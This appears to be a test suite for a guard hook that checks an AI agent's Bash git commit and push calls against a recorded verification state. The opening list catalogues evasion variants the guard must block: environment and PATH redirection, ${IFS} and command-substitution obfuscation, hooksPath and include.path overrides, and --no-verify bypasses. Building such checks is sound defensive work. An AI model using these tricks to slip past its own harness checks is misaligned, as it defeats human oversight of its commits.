        "PATH=../proxy-bin git commit -m x",
        "HOME=../alternate-home git push origin main",
        "XDG_CONFIG_HOME=../alternate-config git commit -m x",
        "env GIT_DIR=../other/.git GIT_WORK_TREE=../other git commit -m x",
        "env PATH=../proxy-bin git commit -m x",
        "env --unset=HOME git push origin main",
        "env -i GIT_COMMON_DIR=../other/.git git push origin main",
        "env -S 'git commit -m x'",
        "$(true; printf git) commit -m x",
        "`true; printf git` push origin main",
        "$GIT commit -m x",
        "${GIT} push origin main",
        "${GIT:-git} commit -m x",
        "$(printf git) commit -m x",
        "`printf git` push origin main",
        "git${IFS}push . --all",
        "g${EMPTY}it${IFS}commit -m x",
        "command${IFS}git${IFS}push . --all",
        "${GIT:-git}${IFS}push origin HEAD",
        "$GIT${IFS}commit -m x",
        "$(printf git)${IFS}commit -m x",
        "`printf git`${IFS}push origin HEAD",
        "${X:=git}${IFS}push origin HEAD",
        "${X=git}${IFS}commit -m x",
        "${X-git}${IFS}push origin HEAD",
        "${X:+git}${IFS}commit -m x",
        "${X:-g}it${IFS}push origin HEAD",
        "git${IFS}${V:-pu}sh origin HEAD",
        "$(printf g)it${IFS}push origin HEAD",
        "`printf gi`t${IFS}commit -m x",
        "command git commit -m x",
        "git --git-dir ../other/.git --work-tree ../other commit -m x",
        "git --exec-path=../proxy-libexec commit -m x",
        `git -c include.path=${indirectConfig.replaceAll("\\", "/")} commit -m x`,
        "git --config-env=include.path=SEMCTX_GIT_CONFIG commit -m x",
        "git -ccore.hooksPath=.semctx/no-hooks commit -m x",
        "/tmp/proxy/git commit -m x",
        "C:\\proxy\\git.exe push origin main",
      ];
    beforeAll(() => {
      repo = createGuardedRepo("semctx-guard-retarget-");
    const indirectHooks = join(repo, ".semctx", "indirect-hooks");
    indirectConfig = join(repo, ".semctx", "indirect.gitconfig");
    mkdirSync(indirectHooks);
    writeFileSync(join(indirectHooks, "pre-commit"), "#!/bin/sh\ngit add tracked.ts\n");
    writeFileSync(
      indirectConfig,
      `[core]\n\thooksPath = ${indirectHooks.replaceAll("\\", "/")}\n`,
    );
    }, 15_000);
    afterAll(() => {
      if (repo) rmSync(repo, { recursive: true, force: true });
    }, 15_000);
    for (const [index, label] of commands("<owned-config>").entries()) {
      it(`${index + 1}: ${label}`, () => {
        const command = commands(indirectConfig)[index]!;
        const result = spawnSync("node", [guard], {
          cwd: repo,
          input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo }),
          encoding: "utf8",
        });
        if (result.status !== 2) console.error("Guard retargeting fixture child failed", JSON.stringify({
          command, status: result.status, signal: result.signal, error: result.error?.message ?? null,
          stdout: result.stdout?.slice(0, 8192) ?? null, stderr: result.stderr?.slice(0, 8192) ?? null,
        }));
        expect(result.status, command).toBe(2);
        expect(result.stderr, command).toContain("must be an isolated command");
      }, 15_000);
    }
  });

  it("anchors guarded state at the Git root when push starts in or targets a subdirectory", () => {
    const repo = createGuardedRepo("semctx-guard-subdirectory-");
    const nested = join(repo, "packages", "nested");
    mkdirSync(nested, { recursive: true });
    try {
      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      for (const scenario of [
        { processCwd: repo, inputCwd: repo, command: "git -C packages push . other:refs/heads/target" },
        { processCwd: nested, inputCwd: nested, command: "git push . other:refs/heads/target" },
      ]) {
        const result = spawnSync("node", [guard], {
          cwd: scenario.processCwd,
          input: JSON.stringify({ tool_name: "Bash", tool_input: { command: scenario.command }, cwd: scenario.inputCwd }),
          encoding: "utf8",
        });
        expect(result.status, scenario.command).toBe(2);
        expect(result.stderr).toContain("may publish only the verified HEAD");
      }
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  it("fails closed from a nested guarded repository when Git root discovery fails", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-root-failure-"));
    const nested = join(repo, "packages", "nested");
    mkdirSync(nested, { recursive: true });
    mkdirSync(join(repo, ".semctx"));
    writeFileSync(join(repo, ".git"), "invalid git metadata\n");
    writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
    try {
      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      const result = spawnSync("node", [guard], {
        cwd: nested,
        input: JSON.stringify({
          tool_name: "Bash",
          tool_input: { command: "git -c safe.directory=* push ." },
          cwd: nested,
        }),
        encoding: "utf8",
      });
      expect(result.status).toBe(2);
      expect(result.stderr).toContain("semctx guarded mode");
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });
});

describe("verification-state capture parity", () => {
  it("matches the application service for tracked and untracked bytes", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-parity-"));
    try {
      execFileSync("git", ["init"], { cwd: repo, stdio: "ignore" });
      writeFileSync(join(repo, "tracked.ts"), "export const value = 1;\n");
      execFileSync("git", ["add", "tracked.ts"], { cwd: repo, stdio: "ignore" });
      execFileSync(
        "git",
        ["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "baseline"],
        { cwd: repo, stdio: "ignore" },
      );
      writeFileSync(join(repo, "tracked.ts"), "export const value = 2;\n");
      writeFileSync(join(repo, "untracked.ts"), "export const extra = true;\n");

      expect(captureVerificationGitState(repo)).toEqual(captureApplicationVerificationGitState(repo));
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  it("changes on byte, path, and untracked-state drift", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-drift-"));
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, stdio: "ignore" });
    try {
      git(["init"]);
      writeFileSync(join(repo, "tracked.ts"), "export const value = 1;\n");
      git(["add", "tracked.ts"]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "base"]);
      const baseline = captureVerificationGitState(repo);

      writeFileSync(join(repo, "tracked.ts"), "export const value = 2;\n");
      expect(captureVerificationGitState(repo).contentStateHash).not.toBe(baseline.contentStateHash);
      git(["checkout", "--", "tracked.ts"]);

      renameSync(join(repo, "tracked.ts"), join(repo, "renamed.ts"));
      expect(captureVerificationGitState(repo).repositoryStateHash).not.toBe(baseline.repositoryStateHash);
      renameSync(join(repo, "renamed.ts"), join(repo, "tracked.ts"));

      writeFileSync(join(repo, "untracked.ts"), "export const extra = true;\n");
      const withUntracked = captureVerificationGitState(repo);
      expect(withUntracked.contentStateHash).not.toBe(baseline.contentStateHash);
      expect(withUntracked.repositoryStateHash).not.toBe(baseline.repositoryStateHash);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  it("treats a core.symlinks=false checkout as the logical Git symlink", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-symlink-file-"));
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, encoding: "utf8" }).trim();
    try {
      git(["init"]);
      git(["config", "core.symlinks", "false"]);
      writeFileSync(join(repo, "target.txt"), "target\n");
      writeFileSync(join(repo, "link"), "target.txt");
      git(["add", "target.txt"]);
      const linkObject = git(["hash-object", "-w", "link"]);
      git(["update-index", "--add", "--cacheinfo", `120000,${linkObject},link`]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "symlink"]);
      expect(git(["status", "--porcelain"])).toBe("");
      const state = captureVerificationGitState(repo);
      expect(state.repositoryStateHash).toBe(state.headTreeHash);
      expect(state).toEqual(captureApplicationVerificationGitState(repo));
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  it("includes absent skip-worktree entries in a clean sparse repository state", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-sparse-"));
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, encoding: "utf8" }).trim();
    try {
      git(["init"]);
      writeFileSync(join(repo, "visible.ts"), "export const visible = true;\n");
      writeFileSync(join(repo, "hidden.ts"), "export const hidden = true;\n");
      git(["add", "."]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "tree"]);
      git(["update-index", "--skip-worktree", "hidden.ts"]);
      rmSync(join(repo, "hidden.ts"));
      expect(git(["status", "--porcelain"])).toBe("");
      const state = captureVerificationGitState(repo);
      expect(state.repositoryStateHash).toBe(state.headTreeHash);
      expect(state).toEqual(captureApplicationVerificationGitState(repo));
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  it("hashes present tracked bytes even when index flags suppress Git diff", () => {
    for (const flag of ["--assume-unchanged", "--skip-worktree"]) {
      const repo = mkdtempSync(join(tmpdir(), "semctx-guard-hidden-worktree-"));
      const git = (args: string[]) => execFileSync("git", args, { cwd: repo, encoding: "utf8" }).trim();
      try {
        git(["init"]);
        writeFileSync(join(repo, "tracked.ts"), "export const value = 1;\n");
        git(["add", "tracked.ts"]);
        git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "base"]);
        const baseline = captureVerificationGitState(repo);

        git(["update-index", flag, "tracked.ts"]);
        writeFileSync(join(repo, "tracked.ts"), "export const value = 2;\n");
        expect(git(["diff", "--name-only"]), flag).toBe("");
        const changed = captureVerificationGitState(repo);
        expect(changed.contentStateHash, flag).not.toBe(baseline.contentStateHash);
        expect(changed.repositoryStateHash, flag).not.toBe(baseline.repositoryStateHash);
        expect(changed, flag).toEqual(captureApplicationVerificationGitState(repo));
        expect(() => captureRecordableVerificationGitState(repo), flag).toThrow("hidden from the analyzed Git diff");
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    }
  }, 20_000);

  // Two real repositories, submodule setup and both capture implementations exceed
  // 15 seconds on Windows; keep the assertions within the canonical test budget.
  it("preserves a clean gitlink and fails closed when its indexed commit changes", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-gitlink-"));
    const child = mkdtempSync(join(tmpdir(), "semctx-guard-gitlink-child-"));
    const aliasParent = mkdtempSync(join(tmpdir(), "semctx-guard-gitlink-alias-"));
    const repoAlias = join(aliasParent, "repo");
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, encoding: "utf8" }).trim();
    const childGit = (args: string[]) => execFileSync("git", args, { cwd: child, encoding: "utf8" }).trim();
    try {
      childGit(["init"]);
      writeFileSync(join(child, "dependency.ts"), "export const value = 1;\n");
      childGit(["add", "dependency.ts"]);
      childGit(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "first"]);
      const firstCommit = childGit(["rev-parse", "HEAD"]);
      writeFileSync(join(child, "dependency.ts"), "export const value = 2;\n");
      childGit(["add", "dependency.ts"]);
      childGit(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "second"]);

      git(["init"]);
      git(["-c", "protocol.file.allow=always", "submodule", "add", child, "vendor"]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "gitlink"]);
      symlinkSync(repo, repoAlias, process.platform === "win32" ? "junction" : "dir");

      const state = captureVerificationGitState(repo);
      expect(state.repositoryStateHash).toBe(state.headTreeHash);
      expect(state).toEqual(captureApplicationVerificationGitState(repo));
      expect(captureVerificationGitState(repoAlias)).toEqual(state);
      expect(captureApplicationVerificationGitState(repoAlias)).toEqual(state);

      git(["config", "diff.ignoreSubmodules", "all"]);
      git(["config", "submodule.vendor.ignore", "all"]);
      const materializedVendor = join(repo, "vendor");
      const hiddenVendor = join(aliasParent, "vendor.proof-materialized");
      renameSync(materializedVendor, hiddenVendor);
      symlinkSync(hiddenVendor, materializedVendor, process.platform === "win32" ? "junction" : "dir");
      expect(() => captureVerificationGitState(repo)).toThrow("symlinked gitlink verification input is unsupported");
      expect(() => captureApplicationVerificationGitState(repo)).toThrow("symlinked gitlink verification input is unsupported");
      rmSync(materializedVendor, { force: true });
      renameSync(hiddenVendor, materializedVendor);

      const moduleHead = join(repo, ".git", "modules", "vendor", "HEAD");
      const hiddenModuleHead = `${moduleHead}.proof-mutant`;
      renameSync(moduleHead, hiddenModuleHead);
      expect(() => captureVerificationGitState(repo)).toThrow("cannot resolve initialized gitlink");
      expect(() => captureApplicationVerificationGitState(repo)).toThrow("cannot resolve initialized gitlink");
      renameSync(hiddenModuleHead, moduleHead);

      execFileSync("git", ["checkout", firstCommit], { cwd: join(repo, "vendor"), stdio: "ignore" });
      expect(git(["diff", "--name-only"])).toBe("");
      expect(() => captureVerificationGitState(repo)).toThrow("changed gitlink verification input is unsupported");
      expect(() => captureApplicationVerificationGitState(repo)).toThrow("changed gitlink verification input is unsupported");
      expect(() => captureVerificationGitState(repoAlias)).toThrow("changed gitlink verification input is unsupported");
      expect(() => captureApplicationVerificationGitState(repoAlias)).toThrow("changed gitlink verification input is unsupported");
    } finally {
      rmSync(aliasParent, { recursive: true, force: true });
      rmSync(repo, { recursive: true, force: true });
      rmSync(child, { recursive: true, force: true });
    }
  }, 60_000);

  it.skipIf(process.platform === "win32")("changes on executable-mode and symlink-target drift", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-metadata-"));
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, stdio: "ignore" });
    try {
      git(["init"]);
      writeFileSync(join(repo, "tool.sh"), "#!/bin/sh\nexit 0\n");
      symlinkSync("tool.sh", join(repo, "tool-link"));
      git(["add", "tool.sh", "tool-link"]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "base"]);
      const baseline = captureVerificationGitState(repo);

      chmodSync(join(repo, "tool.sh"), 0o755);
      expect(captureVerificationGitState(repo).repositoryStateHash).not.toBe(baseline.repositoryStateHash);
      chmodSync(join(repo, "tool.sh"), 0o644);
      rmSync(join(repo, "tool-link"));
      symlinkSync("missing.sh", join(repo, "tool-link"));
      expect(captureVerificationGitState(repo).contentStateHash).not.toBe(baseline.contentStateHash);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });
});

describe("resolveGitCwd — evaluate the repo the command targets, not the session cwd", () => {
  const SESSION = resolve("/session/root");

  it("falls back to inputCwd for a plain git commit", () => {
    expect(resolveGitCwd("git commit -m x", SESSION)).toBe(SESSION);
  });

  it("honors git -C <relative>, resolved against inputCwd", () => {
    expect(resolveGitCwd("git -C sub commit -m x", SESSION)).toBe(resolve(SESSION, "sub"));
    expect(resolveGitCwd("git -Csub commit -m x", SESSION)).toBe(resolve(SESSION, "sub"));
  });

  it("honors a `cd <path> &&` prefix", () => {
    expect(resolveGitCwd("cd repo && git commit -m x", SESSION)).toBe(resolve(SESSION, "repo"));
  });

  it("accumulates chained cd, and applies -C on top of the running cd", () => {
    expect(resolveGitCwd("cd a && cd b && git commit", SESSION)).toBe(resolve(SESSION, "a", "b"));
    expect(resolveGitCwd("cd a && git -C c commit", SESSION)).toBe(resolve(SESSION, "a", "c"));
  });

  it("skips env assignments before git", () => {
    expect(resolveGitCwd("GIT_AUTHOR_NAME=x git -C sub commit", SESSION)).toBe(resolve(SESSION, "sub"));
    expect(resolveGitCwd("env -i GIT_AUTHOR_NAME=x git -C sub commit", SESSION)).toBe(resolve(SESSION, "sub"));
    expect(resolveGitCwd("env -u SEMCTX_UNUSED command git -C sub push", SESSION)).toBe(resolve(SESSION, "sub"));
  });

  it("honors -C when git is invoked through an absolute path or command wrapper", () => {
    expect(resolveGitCwd("/usr/bin/git -C sub commit", SESSION)).toBe(resolve(SESSION, "sub"));
    expect(resolveGitCwd("command git -C sub push", SESSION)).toBe(resolve(SESSION, "sub"));
  });

  it("resolves the same nested shell body used for terminal-command detection", () => {
    expect(resolveGitCwd("bash -c 'git -C ../other commit -m x'", SESSION)).toBe(resolve(SESSION, "../other"));
    expect(resolveGitCwd("sh -c 'cd nested && git push origin main'", SESSION)).toBe(resolve(SESSION, "nested"));
  });

  it("resolves an absolute -C path independently of inputCwd", () => {
    const abs = resolve("/other/repo");
    expect(resolveGitCwd(`git -C ${abs} commit`, SESSION)).toBe(abs);
  });

  it("regression: a git -C into another repo is NOT evaluated against the session repo", () => {
    // The cross-repo bug: `git -C <other> commit` from a guarded session must resolve to <other>,
    // whose (absent) guard.json makes it advisory — never the session repo's guard state.
    const other = resolve("/other/repo");
    expect(resolveGitCwd(`git -C ${other} commit -m x`, SESSION)).not.toBe(SESSION);
  });
});

describe("project-managed hooks (ADR 0029) — hook bypass and the hook-surface policy", () => {
  it("detects --no-verify (and -n) on commit; on push only --no-verify, because -n is --dry-run there", () => {
    expect(commandRequestsHookBypass("git commit -m x")).toBe(false);
    expect(commandRequestsHookBypass("git commit --no-verify -m x")).toBe(true);
    expect(commandRequestsHookBypass("git commit -n -m x")).toBe(true);
    expect(commandRequestsHookBypass("git commit -nm x")).toBe(true);
    expect(commandRequestsHookBypass("git commit --no-veri -m x")).toBe(true);
    expect(commandRequestsHookBypass("git commit -m n")).toBe(false);
    expect(commandRequestsHookBypass("git commit -C n")).toBe(false);
    expect(commandRequestsHookBypass("git commit -Cfeature/n -m x")).toBe(false);
    expect(commandRequestsHookBypass("git commit -qn -m x")).toBe(true);
    expect(commandRequestsHookBypass("git commit -qmn")).toBe(false);
    expect(commandRequestsHookBypass("git commit -un -m x")).toBe(false);
    expect(commandRequestsHookBypass("git -C repo commit --no-verify")).toBe(true);
    expect(commandRequestsHookBypass("cd repo && git commit --no-verify -m x")).toBe(true);
    expect(commandRequestsHookBypass("git push --no-verify origin HEAD")).toBe(true);
    expect(commandRequestsHookBypass("git push --no-ver origin HEAD")).toBe(true);
    expect(commandRequestsHookBypass("git push -n origin HEAD")).toBe(false);
    expect(commandRequestsHookBypass("git push origin HEAD")).toBe(false);
    expect(commandRequestsHookBypass("git status")).toBe(false);
  });

  it("blocks a hook bypass before consulting any recorded state, on both verbs", () => {
    for (const terminalVerb of ["commit", "push"] as const) {
      const decision = guardDecision({
        enabled: true,
        terminalVerb,
        commandIsolated: true,
        hookBypassRequested: true,
        state: null,
        currentState: null,
      });
      expect(decision.block).toBe(true);
      expect(decision.reason).toContain("--no-verify");
      expect(decision.reason).toContain("hook bypass is not authorized");
    }
  });

  it("skips the hook-surface rule only under the declaration, and keeps every tree check", () => {
    const sha = `sha256:${"a".repeat(64)}`;
    const other = `sha256:${"b".repeat(64)}`;
    const synthetic = {
      headCommit: "c".repeat(40),
      analyzedSourceHash: sha,
      workingStateHash: sha,
      contentStateHash: sha,
      repositoryStateHash: sha,
      indexStateHash: sha,
      headTreeHash: sha,
    };
    const state = { version: 3, ...synthetic, verdict: "PASS", recordedAt: "2026-09-16T00:00:00.000Z" };

    // Default rule unchanged: an active hook is non-authorizing, and the message names the way out.
    const sampleOnly = guardDecision({
      enabled: true,
      terminalVerb: "commit",
      commandIsolated: true,
      commitHooksAbsent: false,
      state,
      currentState: synthetic,
    });
    expect(sampleOnly.block).toBe(true);
    expect(sampleOnly.reason).toContain("project-managed");

    expect(guardDecision({
      enabled: true,
      terminalVerb: "commit",
      commandIsolated: true,
      commitHooksAbsent: false,
      hooksProjectManaged: true,
      state,
      currentState: synthetic,
    })).toEqual({ block: false });

    // The declaration relaxes the hook surface, never the index/tree binding.
    const partial = guardDecision({
      enabled: true,
      terminalVerb: "commit",
      commandIsolated: true,
      commitHooksAbsent: false,
      hooksProjectManaged: true,
      state,
      currentState: { ...synthetic, indexStateHash: other },
    });
    expect(partial.block).toBe(true);
    expect(partial.reason).toContain("does not exactly materialize");

    expect(guardDecision({
      enabled: true,
      terminalVerb: "push",
      commandIsolated: true,
      pushHooksAbsent: false,
      hooksProjectManaged: true,
      state,
      currentState: synthetic,
    })).toEqual({ block: false });

    const drifted = guardDecision({
      enabled: true,
      terminalVerb: "push",
      commandIsolated: true,
      pushHooksAbsent: false,
      hooksProjectManaged: true,
      state,
      currentState: { ...synthetic, headTreeHash: other },
    });
    expect(drifted.block).toBe(true);
    expect(drifted.reason).toContain("not the last pre-commit command");
    expect(drifted.reason).not.toContain("Re-run");

    // Working-tree drift after an exact commit keeps HEAD equal to the record: the generic reason,
    // never the hook-order attribution.
    const edited = guardDecision({
      enabled: true,
      terminalVerb: "push",
      commandIsolated: true,
      pushHooksAbsent: false,
      hooksProjectManaged: true,
      state,
      currentState: { ...synthetic, contentStateHash: other, repositoryStateHash: other, headTreeHash: sha },
    });
    expect(edited.block).toBe(true);
    expect(edited.reason).toContain("Re-run");
    expect(edited.reason).not.toContain("hook order");
  });

  it("reads the declaration from guard.json; any other hooks value keeps enforcement on with the default rule", () => {
    const dir = mkdtempSync(join(tmpdir(), "semctx-guard-hooks-policy-"));
    try {
      mkdirSync(join(dir, ".semctx"));
      const guardPath = join(dir, ".semctx", "guard.json");
      writeFileSync(guardPath, JSON.stringify({ enabled: true, hooks: "project-managed" }));
      expect(guardEnabledForInvocation({ command: "git commit -m x", cwd: dir, env: {} })).toBe(true);
      writeFileSync(guardPath, JSON.stringify({ enabled: true, hooks: "lefthook" }));
      // A typo must never turn the guard advisory: the file stays readable and enabled, and only the
      // exact declaration relaxes the sample-only rule.
      expect(guardEnabledForInvocation({ command: "git commit -m x", cwd: dir, env: {} })).toBe(true);
      expect(guardHooksProjectManaged({ enabled: true, hooks: "lefthook" })).toBe(false);
      expect(guardHooksProjectManaged({ enabled: true, hooks: "project-managed" })).toBe(true);
      expect(guardHooksProjectManaged({ enabled: true })).toBe(false);
      expect(guardHooksProjectManaged(null)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("replays: a restaging pre-commit hook is allowed at commit time and its drift is caught at push time", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-project-managed-"));
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, stdio: "ignore" });
    try {
      git(["init"]);
      writeFileSync(join(repo, ".gitignore"), ".semctx/\n");
      writeFileSync(join(repo, "a.ts"), "export const a = 1;\n");
      git(["add", "-A"]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "base"]);
      writeFileSync(join(repo, "a.ts"), "export const a = 2;\n");
      git(["add", "-A"]);
      const verified = captureVerificationGitState(repo);
      mkdirSync(join(repo, ".semctx"));
      writeFileSync(
        join(repo, ".semctx", "guard.json"),
        JSON.stringify({ enabled: true, hooks: "project-managed" }),
      );
      writeFileSync(
        join(repo, ".semctx", "verification-state.json"),
        JSON.stringify({ version: 3, ...verified, verdict: "PASS", recordedAt: "2026-09-16T00:00:00.000Z" }),
      );
      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      const run = (command: string) => spawnSync("node", [guard], {
        cwd: repo,
        input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo }),
        encoding: "utf8",
      });

      // A writer hook: the formatter rewrites and restages a.ts after the pre-tool check.
      const preCommit = join(repo, ".git", "hooks", "pre-commit");
      writeFileSync(preCommit, "#!/bin/sh\nprintf 'export const formatted = true;\\n' >> a.ts\ngit add a.ts\n");
      chmodSync(preCommit, 0o755);
      expect(commitHookSurfaceClear(repo)).toBe(false);
      expect(run("git commit -m x").status).toBe(0);
      expect(run("git commit --no-verify -m x").status).toBe(2);
      expect(run("git commit -nm x").status).toBe(2);

      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "formatted"]);
      const committed = captureVerificationGitState(repo);
      expect(committed.headTreeHash).not.toBe(verified.repositoryStateHash);

      // The push-side HEAD check is the ordering verifier: the writer ran after the recorded proof.
      const push = run("git push . HEAD");
      expect(push.status).toBe(2);
      expect(push.stderr).toContain("not the last pre-commit command");
      expect(push.stderr).not.toContain("Re-run");
      expect(run("git push --no-verify . HEAD").status).toBe(2);

      // `semctx verify hook pre-commit` as the last job records the post-writer tree before the
      // commit object exists; the emulated record below is what that job writes.
      writeFileSync(
        join(repo, ".semctx", "verification-state.json"),
        JSON.stringify({ version: 3, ...committed, verdict: "PASS", recordedAt: "2026-09-16T00:00:01.000Z" }),
      );
      const prePush = join(repo, ".git", "hooks", "pre-push");
      writeFileSync(prePush, "#!/bin/sh\nexit 0\n");
      chmodSync(prePush, 0o755);
      expect(pushHookSurfaceClear(repo)).toBe(false);
      expect(run("git push . HEAD").status).toBe(0);

      // Ordinary working-tree drift after that exact commit is not misattributed to hook ordering.
      writeFileSync(join(repo, "a.ts"), "export const a = 3;\n");
      const drift = run("git push . HEAD");
      expect(drift.status).toBe(2);
      expect(drift.stderr).toContain("Re-run");
      expect(drift.stderr).not.toContain("hook order");
      writeFileSync(join(repo, "a.ts"), "export const a = 2;\nexport const formatted = true;\n");
      expect(run("git push . HEAD").status).toBe(0);

      // Without the declaration the sample-only rule is exactly what it was.
      writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
      expect(run("git push . HEAD").status).toBe(2);
      expect(run("git commit -m x").status).toBe(2);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  }, 30_000);
});
